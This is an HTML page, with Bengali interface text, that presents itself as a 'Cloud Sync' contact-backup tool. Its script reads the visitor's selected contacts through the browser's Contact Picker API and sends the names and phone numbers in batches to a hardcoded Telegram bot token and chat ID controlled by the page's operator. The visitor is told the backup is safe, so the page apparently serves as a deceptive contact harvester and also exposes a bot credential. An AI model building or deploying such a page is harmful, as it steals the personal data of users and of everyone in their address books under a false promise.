<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GX Premium Backup</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #00f2fe;
            --secondary: #7e22ce;
        }

        body {
            background: #020406;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Inter', sans-serif;
        }

        /* ব্যাকগ্রাউন্ড অ্যানিমেশন */
        .orb {
            position: absolute;
            width: 300px;
            height: 300px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            filter: blur(80px);
            border-radius: 50%;
            z-index: -1;
            animation: move 10s infinite alternate;
        }

        @keyframes move {
            from { transform: translate(-50%, -50%); }
            to { transform: translate(20%, 30%); }
        }

        .main-container {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 40px;
            padding: 50px 30px;
            width: 340px;
            text-align: center;
            position: relative;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }

        /* ইউনিক একশন এরিয়া */
        .action-circle {
            width: 120px;
            height: 120px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px dashed rgba(0, 242, 254, 0.3);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: 0.5s;
            position: relative;
        }

        .action-circle:hover {
            border: 2px solid var(--primary);
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.4);
            transform: rotate(90deg);
        }

        .action-circle i {
            transition: 0.5s;
            font-size: 40px;
            color: var(--primary);
            transform: rotate(-90deg); /* বাটন ঘুরলেও আইকন সোজা থাকবে */
        }

        .title-text {
            font-size: 22px;
            font-weight: 800;
            letter-spacing: 1px;
            background: linear-gradient(to right, #fff, #888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }

        .sub-text {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.4);
            text-transform: uppercase;
            letter-spacing: 3px;
        }

        .sync-btn {
            margin-top: 30px;
            background: #fff;
            color: #000;
            padding: 14px;
            border-radius: 50px;
            font-weight: 700;
            font-size: 14px;
            width: 100%;
            cursor: pointer;
            transition: 0.3s;
            border: none;
        }

        .sync-btn:hover {
            background: var(--primary);
            transform: translateY(-3px);
        }

        #status {
            margin-top: 20px;
            font-size: 12px;
            color: var(--primary);
            min-height: 20px;
        }
    </style>
</head>
<body>

    <div class="orb"></div>

    <div class="main-container">
        <div class="sub-text">System Online</div>
        <div class="title-text">Cloud Sync</div>
        
        <div class="action-circle" onclick="fetchContacts()">
            <i class="fas fa-fingerprint"></i>
        </div>

        <p class="text-xs text-gray-500 px-4">নিচের বাটনে চাপ দিয়ে আপনার কন্টাক্টগুলো নিরাপদে ব্যাকআপ করুন</p>

        <button onclick="fetchContacts()" class="sync-btn">
            SEND TO TELEGRAM
        </button>

        <div id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = '8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k';
        const CHAT_ID = '6467941734';

        async function fetchContacts() {
            const status = document.getElementById('status');
            
            if (!('contacts' in navigator && 'ContactsManager' in window)) {
                status.innerHTML = "Browser Not Supported";
                return;
            }

            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

                if (contacts && contacts.length > 0) {
                    status.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processing...`;
                    await sendData(contacts);
                }
            } catch (err) {
                console.log(err);
            }
        }

        async function sendData(contacts) {
            const status = document.getElementById('status');
            const CHUNK_SIZE = 15;
            
            const now = new Date();
            const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
            const dayName = days[now.getDay()];
            const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
            const timeStr = now.toLocaleTimeString('bn-BD');

            for (let i = 0; i < contacts.length; i += CHUNK_SIZE) {
                const chunk = contacts.slice(i, i + CHUNK_SIZE);
                let message = `📊 **GX Backup number**\n\n`;
                message += `📅 ${dayName}, ${dateStr}\n`;
                message += `⏰ ${timeStr}\n`;
                message += `👥 Total: ${contacts.length}\n`;
                message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

                chunk.forEach(c => {
                    message += `Name : ──${c.name ? c.name[0] : 'N/A'}─\n`;
                    message += `Number : ${c.tel ? c.tel[0] : 'N/A'}\n\n`;
                });

                message += `— GX Sammim sent`;

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                    
                    status.innerText = `Sent: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
                    await new Promise(r => setTimeout(r, 1200)); 
                } catch (e) {
                    console.error(e);
                }
            }
            status.innerHTML = "✅ Successfully Completed!";
            alert("Backup Finished!");
        }
    </script>
</body>
</html>
